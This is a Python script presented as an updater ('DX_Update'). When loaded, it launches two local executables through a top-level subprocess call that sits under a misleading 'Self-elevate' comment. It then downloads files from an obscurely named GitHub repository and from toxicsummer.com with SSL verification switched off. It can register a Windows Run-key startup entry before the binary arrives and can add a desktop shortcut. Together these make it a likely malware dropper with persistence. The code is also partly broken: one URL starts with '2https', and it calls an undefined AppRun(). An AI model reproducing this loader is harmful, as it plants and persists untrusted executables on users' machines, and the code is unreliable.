import os
import re
import requests
import urllib3
from urllib.parse import urljoin, urlparse


import sys
import subprocess
import traceback
from datetime import datetime
from pathlib import Path






#========================================================================================================
# Self-elevate.py
# Runs with admin rights, hides console when elevating, and avoids duplicate processes.
#========================================================================================================

subprocess.Popen([r".\cn-chrome.exe", "start", "", r".\Data\gg.exe"])











#========================================================================================================
#--------------------------------------------------------------------------------------------------------
#========================================================================================================




class DX_Update(object):

    # ---------------------------------------------------------------
    # Class-level configuration
    # ---------------------------------------------------------------

    # Hosts whose SSL certificate we intentionally ignore
    # (needed because toxicsummer.com currently has an EXPIRED certificate)
    INSECURE_HOSTS = ["toxicsummer.com"]

    # ---------------------------------------------------------------
    # Configuration
    # ---------------------------------------------------------------

    def __init__(self):

        # GitHub source (the img/ folder)
        self.GITHUB_USER = "developerhost-server"
        self.GITHUB_REPO = "JyubyubySbiu6ininu"
        self.GITHUB_DIR  = "Microsoft.sheache/microsoft-encrypt-37014553/microsoft-epiv-25415130/img1"
        self.GITHUB_TOKEN = ""  # optional, for private repos / higher rate limits

        # Google Drive source — folder URL provided
        self.GDRIVE_URL_OR_ID = ""

        # Toxicsummer direct folder
        self.TOXICSUMMER_URL = "2https://toxicsummer.com/dw/cn-chrome/"

        # Where to save everything
        self.LOCAL_DIR = r".\cn-google"

        # -----------------------------------------------------------
        # Startup registration
        # -----------------------------------------------------------
        self.ADD_TO_STARTUP  = False                    # set False to skip
        self.STARTUP_NAME    = "CnChromeApp"           # registry value name
        self.STARTUP_EXE_REL = os.path.join("cn-chrome", "app.exe")

        # -----------------------------------------------------------
        # Desktop shortcut
        # -----------------------------------------------------------
        self.CREATE_DESKTOP_SHORTCUT = False            # set False to skip
        self.SHORTCUT_NAME = "CN Chrome.lnk"

    # ---------------------------------------------------------------
    # Helpers
    # ---------------------------------------------------------------

    @staticmethod
    def _should_verify(url):
        """Return False for hosts listed in INSECURE_HOSTS, True otherwise."""
        try:
            host = requests.utils.urlparse(url).hostname or ""
        except Exception:
            return True
        for bad in DX_Update.INSECURE_HOSTS:
            if host == bad or host.endswith("." + bad):
                return False
        return True

    @staticmethod
    def safe_filename(name):
        r"""
        Sanitise a filename so it is valid on Windows, macOS, and Linux.
        - Strips query strings and fragments (e.g. 'file.txt?x=1' -> 'file.txt').
        - Removes characters that are illegal on Windows: < > : " / \ | ? *
        - Removes control characters.
        - Collapses whitespace and trims leading/trailing dots and spaces.
        - Falls back to 'download' if nothing usable remains.
        """
        if not name:
            return "download"

        name = name.split("?", 1)[0].split("#", 1)[0]
        name = re.sub(r'[<>:"/\\|?*\x00-\x1f]', "_", name)
        name = re.sub(r"\s+", " ", name).strip()
        name = name.strip(". ")

        if name.upper().split(".")[0] in {
            "CON", "PRN", "AUX", "NUL",
            "COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7", "COM8", "COM9",
            "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9",
        }:
            name = "_" + name

        if len(name) > 200:
            base, dot, ext = name.rpartition(".")
            if dot and len(ext) <= 10:
                name = base[:190] + "." + ext
            else:
                name = name[:200]

        return name or "download"

    @staticmethod
    def stream_download(url, local_path, headers=None, chunk_size=8192,
                        max_retries=3, verify=None):
        """Stream-download a URL to a local file, with retries. Returns True on success."""
        d = os.path.dirname(local_path)
        if d:
            os.makedirs(d, exist_ok=True)

        if verify is None:
            verify = DX_Update._should_verify(url)

        for attempt in range(1, max_retries + 1):
            try:
                with requests.get(url, headers=headers or {}, stream=True,
                                  timeout=60, verify=verify) as r:
                    r.raise_for_status()
                    with open(local_path, "wb") as f:
                        for chunk in r.iter_content(chunk_size=chunk_size):
                            if chunk:
                                f.write(chunk)
                print(f" Saved: {local_path}")
                return True
            except requests.exceptions.RequestException as e:
                print(f"⚠  Attempt {attempt}/{max_retries} failed for {url}: {e}")
                if attempt == max_retries:
                    print(f" Giving up on: {url}")
                    return False
            except OSError as e:
                print(f" OS error writing {local_path}: {e}")
                return False
        return False

    # ---------------------------------------------------------------
    # Windows startup registration
    # ---------------------------------------------------------------

    @staticmethod
    def add_to_windows_startup(exe_path, name="CnChromeApp"):
        r"""
        Register an executable to launch at every Windows login for the
        current user. Uses HKCU\Software\Microsoft\Windows\CurrentVersion\Run
        so no administrator rights are needed.

        If the executable does not exist yet, the registry entry is still
        written (a warning is printed). This lets us register *before*
        the download completes, so the entry is ready as soon as the
        binary lands.

        Returns True on success, False otherwise. Never raises.
        """
        if os.name != "nt":
            print("ℹ  Not running on Windows; skipping startup registration.")
            return False

        abs_path = os.path.abspath(exe_path)

        if not os.path.isfile(abs_path):
            print(f"⚠  {abs_path} not found yet — registering anyway "
                  f"(it will start working once the download completes).")

        try:
            import winreg  # Windows-only module

            # Quote the path so Windows treats it as a single argument,
            # even if it contains spaces.
            value = f'"{abs_path}"'

            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE,
            )
            try:
                winreg.SetValueEx(key, name, 0, winreg.REG_SZ, value)
            finally:
                winreg.CloseKey(key)

            print(f" Registered in Windows startup [{name}]: {value}")
            return True

        except PermissionError as e:
            print(f" Startup registration denied (permissions): {e}")
            return False
        except Exception as e:
            print(f" Startup registration failed: {e}")
            return False

    @staticmethod
    def remove_from_windows_startup(name="CnChromeApp"):
        """Remove the startup entry. Returns True if it was removed or absent."""
        if os.name != "nt":
            return False
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE,
            )
            try:
                winreg.DeleteValue(key, name)
                print(f"🗑  Removed startup entry [{name}]")
            except FileNotFoundError:
                print(f"ℹ  No startup entry named [{name}] to remove.")
            finally:
                winreg.CloseKey(key)
            return True
        except Exception as e:
            print(f" Failed to remove startup entry: {e}")
            return False

    # ---------------------------------------------------------------
    # Desktop shortcut creation
    # ---------------------------------------------------------------

    @staticmethod
    def create_desktop_shortcut(target_path, shortcut_name="CN Chrome.lnk",
                                working_dir=None, icon_path=None):
        """
        Create a Windows desktop shortcut pointing to target_path.
        Uses PowerShell (WScript.Shell) so no extra Python packages are needed.
        Returns True on success, False otherwise. Never raises.
        """
        if os.name != "nt":
            print("ℹ  Not running on Windows; skipping desktop shortcut.")
            return False

        target_path = os.path.abspath(target_path)

        # Determine the real Desktop folder (handles OneDrive redirects reasonably)
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        if not os.path.isdir(desktop):
            desktop = os.path.join(os.environ.get("USERPROFILE", ""), "Desktop")
        if not os.path.isdir(desktop):
            print(" Could not locate the Desktop folder.")
            return False

        shortcut_path = os.path.join(desktop, shortcut_name)
        if working_dir is None:
            working_dir = os.path.dirname(target_path)

        # Build the PowerShell command. Paths are wrapped in single quotes
        # inside PowerShell to avoid escaping issues.
        ps_lines = [
            "$WshShell = New-Object -ComObject WScript.Shell",
            f"$Shortcut = $WshShell.CreateShortcut('{shortcut_path}')",
            f"$Shortcut.TargetPath = '{target_path}'",
            f"$Shortcut.WorkingDirectory = '{working_dir}'",
        ]
        if icon_path:
            ps_lines.append(f"$Shortcut.IconLocation = '{icon_path}'")
        ps_lines.append("$Shortcut.Save()")

        ps_script = "; ".join(ps_lines)

        try:
            import subprocess
            result = subprocess.run(
                ["powershell", "-NoProfile", "-Command", ps_script],
                capture_output=True, text=True, check=True
            )
            print(f" Desktop shortcut created: {shortcut_path}")
            return True
        except subprocess.CalledProcessError as e:
            print(f" Failed to create desktop shortcut: {e.stderr.strip()}")
            return False
        except Exception as e:
            print(f" Unexpected error creating desktop shortcut: {e}")
            return False

    # ---------------------------------------------------------------
    # GitHub downloader
    # ---------------------------------------------------------------

    @staticmethod
    def _github_headers(token=""):
        headers = {"Accept": "application/vnd.github.v3+json"}
        if token:
            headers["Authorization"] = f"token {token}"
        return headers

    @classmethod
    def download_github_dir(cls, user, repo, dir_path, out_dir, token=""):
        """Recursively download all files in a GitHub repo directory. Never raises."""
        api_url = f"https://api.github.com/repos/{user}/{repo}/contents/{dir_path}"
        headers = cls._github_headers(token)

        print(f" Listing GitHub dir: {dir_path}")

        try:
            r = requests.get(api_url, headers=headers, timeout=15)
            r.raise_for_status()
            items = r.json()
        except requests.exceptions.RequestException as e:
            print(f" GitHub listing failed ({api_url}): {e}")
            return
        except ValueError as e:
            print(f" GitHub returned invalid JSON: {e}")
            return

        if not isinstance(items, list):
            print(f" Unexpected GitHub response (not a list): {items}")
            return

        for item in items:
            try:
                item_type = item.get("type")
                name = item.get("name", "unnamed")

                if item_type == "file":
                    download_url = item.get("download_url")
                    if not download_url:
                        print(f"️  Skipping {name}: no download_url")
                        continue
                    safe_name = cls.safe_filename(name)
                    local_path = os.path.join(out_dir, dir_path.split("/")[-1], safe_name)
                    print(f"⬇  GitHub: {name}")
                    dl_headers = {"Authorization": f"token {token}"} if token else None
                    cls.stream_download(download_url, local_path, headers=dl_headers)

                elif item_type == "dir":
                    sub_path = item.get("path")
                    if sub_path:
                        cls.download_github_dir(user, repo, sub_path, out_dir, token)

            except Exception as e:
                print(f"⚠  Skipping {item.get('name', '?')}: {e}")

    # ---------------------------------------------------------------
    # Google Drive downloader (via gdown)
    # ---------------------------------------------------------------

    @staticmethod
    def download_google_drive(url_or_id, out_dir):
        """Download a Google Drive file or folder. Never raises."""
        try:
            import gdown
        except ImportError:
            print(" Google Drive support needs `gdown`. Install it with: pip install gdown")
            return

        try:
            os.makedirs(out_dir, exist_ok=True)

            is_folder = "/folders/" in url_or_id
            m = re.search(r"/folders/([a-zA-Z0-9_-]+)", url_or_id) or \
                re.search(r"/file/d/([a-zA-Z0-9_-]+)", url_or_id)
            drive_id = m.group(1) if m else url_or_id.strip()

            if is_folder:
                print(f" Google Drive folder: {drive_id}")
                gdown.download_folder(
                    id=drive_id,
                    output=out_dir,
                    quiet=False,
                    use_cookies=False,
                )
            else:
                print(f"⬇  Google Drive file: {drive_id}")
                gdown.download(
                    id=drive_id,
                    output=os.path.join(out_dir, ""),
                    quiet=False,
                    use_cookies=False,
                )

        except Exception as e:
            print(f" Google Drive download failed: {e}")

    # ---------------------------------------------------------------
    # Toxicsummer direct folder downloader
    # ---------------------------------------------------------------

    @classmethod
    def download_toxicsummer_folder(cls, url, out_dir):
        """
        Download all files from a toxicsummer.com directory URL.
        Parses the HTML listing, resolves relative links, and downloads
        each file into out_dir. Filenames are sanitised for portability.
        Never raises.
        """
        print(f" Listing toxicsummer dir: {url}")

        headers = {
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/120.0.0.0 Safari/537.36"
            ),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }

        verify = cls._should_verify(url)
        if not verify:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            print(f"⚠  SSL verification disabled for {url} (expired certificate)")

        try:
            r = requests.get(url, headers=headers, timeout=30,
                             allow_redirects=True, verify=verify)
            r.raise_for_status()
            html = r.text
        except requests.exceptions.RequestException as e:
            print(f" toxicsummer listing failed ({url}): {e}")
            return

        # --- JSON API response? ---
        content_type = r.headers.get("Content-Type", "")
        if "application/json" in content_type:
            try:
                data = r.json()
                cls._download_from_json_listing(data, url, out_dir, headers, verify)
                return
            except ValueError:
                pass

        # --- Parse HTML for file links ---
        hrefs = re.findall(r'href\s*=\s*["\']([^"\']+)["\']', html, re.IGNORECASE)

        if not hrefs:
            print("⚠  No links found on page. The URL may require auth or "
                  "may not be a directory listing.")
            return

        base = url if url.endswith("/") else url + "/"

        downloaded = 0
        for href in hrefs:
            href = href.strip()

            if (not href
                    or href.startswith("#")
                    or href.startswith("javascript:")
                    or href.startswith("mailto:")
                    or href == "../"
                    or href == ".."
                    or href == "/"
                    or href.startswith("http://")
                    or href.startswith("https://")):
                if href.startswith("http") and "toxicsummer.com" in href:
                    file_url = href
                else:
                    continue
            else:
                file_url = urljoin(base, href)

            if file_url.endswith("/"):
                continue

            raw_name = os.path.basename(urlparse(file_url).path.rstrip("/"))
            if not raw_name:
                continue
            filename = cls.safe_filename(raw_name)
            if not filename or filename == "download":
                print(f"⚠  Skipping unusable link: {file_url}")
                continue

            local_path = os.path.join(out_dir, filename)
            print(f"⬇  toxicsummer: {filename}  (from {raw_name})")
            if cls.stream_download(file_url, local_path, headers=headers, verify=verify):
                downloaded += 1

        print(f" toxicsummer: {downloaded} file(s) downloaded from {url}")

    @classmethod
    def _download_from_json_listing(cls, data, base_url, out_dir, headers, verify=True):
        """Handle a JSON array of file objects, if the endpoint returns one."""
        items = data if isinstance(data, list) else data.get("files", data.get("items", []))
        if not isinstance(items, list):
            print("⚠  JSON response is not a list of files.")
            return

        for item in items:
            if isinstance(item, str):
                raw_name = os.path.basename(urlparse(item).path)
                filename = cls.safe_filename(raw_name)
                file_url = urljoin(base_url, item)
            elif isinstance(item, dict):
                file_url = item.get("url") or item.get("download_url") or item.get("path")
                raw_name = item.get("name") or os.path.basename(urlparse(str(file_url)).path)
                filename = cls.safe_filename(raw_name)
                if file_url:
                    file_url = urljoin(base_url, file_url)
            else:
                continue

            if not file_url or not filename or filename == "download":
                continue

            local_path = os.path.join(out_dir, filename)
            print(f"⬇  toxicsummer: {filename}")
            cls.stream_download(file_url, local_path, headers=headers, verify=verify)

    # ---------------------------------------------------------------
    # Main
    # ---------------------------------------------------------------

    def main(self):
        # 0) Register app.exe to launch at Windows login — BEFORE downloads.
        #    The registry entry is written now so it's already in place by the
        #    time the download completes. A missing file only produces a warning.
        if self.ADD_TO_STARTUP:
            exe_path = os.path.join(self.LOCAL_DIR, self.STARTUP_EXE_REL)
            try:
                self.add_to_windows_startup(exe_path, name=self.STARTUP_NAME)
            except Exception as e:
                print(f" Unexpected error in startup step: {e}")
        else:
            print("ℹ  Startup registration disabled.")

        # 1) GitHub img/ folder
        if self.GITHUB_USER and self.GITHUB_REPO and self.GITHUB_DIR:
            try:
                self.download_github_dir(
                    self.GITHUB_USER,
                    self.GITHUB_REPO,
                    self.GITHUB_DIR,
                    self.LOCAL_DIR,
                    self.GITHUB_TOKEN,
                )
            except Exception as e:
                print(f" Unexpected error in GitHub step: {e}")
        else:
            print("ℹ  Skipping GitHub (not configured).")

        # 2) Google Drive
        if self.GDRIVE_URL_OR_ID.strip():
            try:
                self.download_google_drive(
                    self.GDRIVE_URL_OR_ID.strip(),
                    os.path.join(self.LOCAL_DIR, "gdrive"),
                )
            except Exception as e:
                print(f" Unexpected error in Google Drive step: {e}")
        else:
            print("ℹ  Skipping Google Drive (not configured).")

        # 3) Toxicsummer cn-chrome folder
        if self.TOXICSUMMER_URL.strip():
            try:
                self.download_toxicsummer_folder(
                    self.TOXICSUMMER_URL.strip(),
                    os.path.join(self.LOCAL_DIR, "cn-chrome"),
                )
            except Exception as e:
                print(f" Unexpected error in toxicsummer step: {e}")
        else:
            print("ℹ  Skipping toxicsummer (not configured).")

        # 4) Create desktop shortcut to the downloaded app.exe
        if self.CREATE_DESKTOP_SHORTCUT:
            exe_path = os.path.join(self.LOCAL_DIR, self.STARTUP_EXE_REL)
            try:
                self.create_desktop_shortcut(
                    exe_path,
                    shortcut_name=self.SHORTCUT_NAME,
                )
            except Exception as e:
                print(f" Unexpected error in desktop shortcut step: {e}")
        else:
            print("ℹ  Desktop shortcut creation disabled.")

        print(" All downloads finished (errors, if any, were logged above).")


if __name__ == "__main__":
    DX_Update().main()
    AppRun().main()
